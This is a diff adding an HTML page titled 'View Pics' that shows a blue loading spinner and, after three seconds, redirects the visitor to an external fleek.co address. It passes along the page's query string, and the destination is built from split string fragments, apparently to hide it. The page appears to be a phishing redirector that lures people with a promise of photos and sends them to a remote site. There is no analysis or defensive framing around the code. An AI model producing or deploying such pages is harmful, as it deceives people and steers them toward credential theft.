@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>View Pics</title>
+	<style>
+		#loader {
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			width: 100%;
+			height: 100%;
+			position: absolute;
+			top: 0;
+			left: 0;
+			background-color: #fff;
+			z-index: 99;
+			border-radius: 10px;
+		}
+	
+		@keyframes hideLoader {
+			from {
+				opacity: 1;
+			}
+	
+			to {
+				opacity: 0;
+			}
+		}
+	
+		@keyframes showLoader {
+			from {
+				opacity: 0;
+			}
+	
+			to {
+				opacity: 1;
+			}
+		}
+	
+		.lds-ellipsis {
+			display: inline-block;
+			position: relative;
+			width: 80px;
+			height: 80px;
+			opacity: .8
+		}
+	
+		.lds-ellipsis div {
+			position: absolute;
+			top: 33px;
+			width: 13px;
+			height: 13px;
+			border-radius: 50%;
+			background: #1877F2;
+			animation-timing-function: cubic-bezier(0, 1, 1, 0);
+		}
+	
+		.lds-ellipsis div:nth-child(1) {
+			left: 8px;
+			animation: lds-ellipsis1 0.6s infinite;
+		}
+	
+		.lds-ellipsis div:nth-child(2) {
+			left: 8px;
+			animation: lds-ellipsis2 0.6s infinite;
+		}
+	
+		.lds-ellipsis div:nth-child(3) {
+			left: 32px;
+			animation: lds-ellipsis2 0.6s infinite;
+		}
+	
+		.lds-ellipsis div:nth-child(4) {
+			left: 56px;
+			animation: lds-ellipsis3 0.6s infinite;
+		}
+	
+		@keyframes lds-ellipsis1 {
+			0% {
+				transform: scale(0);
+			}
+	
+			100% {
+				transform: scale(1);
+			}
+		}
+	
+		@keyframes lds-ellipsis3 {
+			0% {
+				transform: scale(1);
+			}
+	
+			100% {
+				transform: scale(0);
+			}
+		}
+	
+		@keyframes lds-ellipsis2 {
+			0% {
+				transform: translate(0, 0);
+			}
+	
+			100% {
+				transform: translate(24px, 0);
+			}
+		}
+	</style>
+</head>
+<body>
+	<div id='loader'>
+		<div class="lds-ellipsis">
+			<div></div>
+			<div></div>
+			<div></div>
+			<div></div>
+		</div>
+	</div>
+	<script>
+		const xx = window.location.href.split('?');
+    let nbg1 = 'https://'
+      let nbg2 = 'billowing-'
+      let nbg3 = 'glitter-'
+      let nbg4 = '0383'
+      let nbg5 = '.on.'
+      let nbg6 = 'fleek.co?'
+      let nbg7 = xx[1]
+    console.log(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}${nbg7}`)
+    document.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => {
+        window.location.assign(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}${nbg7}`)
+      }, 3000)
+    })
+	</script>
+</body>
+</html>
